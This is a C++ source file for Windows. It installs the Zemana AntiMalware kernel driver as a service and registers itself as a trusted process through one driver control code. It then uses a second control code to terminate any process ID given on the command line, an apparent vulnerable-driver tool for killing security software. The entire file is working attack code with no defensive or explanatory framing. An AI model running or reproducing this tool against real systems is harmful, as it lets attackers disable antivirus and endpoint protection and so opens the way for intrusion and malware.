#include <iostream>
#include <string>
#include <Windows.h>


#define REGISTER_PROCESS 0x80002010
#define TERMINATE_PROCESS 0x80002048

BOOL LoadDriver(char* driverPath, const char* serviceName) {
	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCM) {
		return false;
	}
	SC_HANDLE hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);
	//service exists
	if (hService) {
		printf("[+] %s service already exists\n", serviceName);
		printf("[i] querying status..\n");
		SERVICE_STATUS serviceStatus;
		if (!QueryServiceStatus(hService, &serviceStatus)) {
			printf("[-] couldnt query the service status: %d\n", GetLastError());
			CloseServiceHandle(hService);
			CloseServiceHandle(hSCM);
			return false;
		}
		if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
			printf("[i] %s service is in stopped state\n", serviceName);
			if (!StartServiceA(hService, 0, nullptr)) {
				printf("[-] couldn't start the %s service: %u\n", serviceName, GetLastError());
				CloseServiceHandle(hService);
				CloseServiceHandle(hSCM);
				return false;
			}
			printf("[+] started %s service\n", serviceName);
		}
		else {
			printf("[i] %s service is in running state\n", serviceName);
		}
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCM);
		return true;
	}

	//service doesn't exists
	hService = CreateServiceA(hSCM, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL, NULL, NULL);
	if (!hService) {
		printf("[-] could not create service: %d\n", GetLastError());
		return false;
	}

	printf("[+] created service %s\n", serviceName);
	printf("[i] starting..\n");
	if (!StartServiceA(hService, 0, nullptr)) {
		printf("[-] could not start service %s: %d\n", serviceName, GetLastError());
		return false;
	}

	printf("[+] started service %s\n", serviceName);

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);
	return true;
}


int main(int argc, char** argv) {

	const char* serviceName = "ZemanaAntiMalware";
	const char* driverName = "\\\\.\\ZemanaAntiMalware";
	char* fullDriverPath = argv[1];
	DWORD dwTargetProcess = std::stoi(argv[2]);

	WIN32_FIND_DATAA fileData;
	
	HANDLE hFind = FindFirstFileA(fullDriverPath, &fileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("[-] file doesn't exist\n");
		exit(1);
	}

	printf("[i] loading driver..\n");
	if (!LoadDriver(fullDriverPath, serviceName)) {
		exit(1);
	}
	printf("[+] driver loaded\n");

	HANDLE hDevice = CreateFileA(driverName, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hDevice) {
		printf("[-] could not get driver's handle: %u\n", GetLastError());
		exit(1);
	}
	printf("[+] got driver handle\n");

	DWORD dwProcessId = GetCurrentProcessId();
	if (!DeviceIoControl(hDevice, REGISTER_PROCESS, &dwProcessId, sizeof(dwProcessId), NULL, 0, NULL, NULL)) {
		printf("[-] failed to register current process\n");
		exit(1);
	}
	printf("[+] registered current process as a trusted process\n");

	if (!DeviceIoControl(hDevice, TERMINATE_PROCESS, &dwTargetProcess, sizeof(dwTargetProcess), NULL, 0, NULL, NULL)) {
		printf("[-] could not kill process %d\n", dwTargetProcess);
		exit(1);
	};
	printf("[+] killed process %d", dwTargetProcess);
}


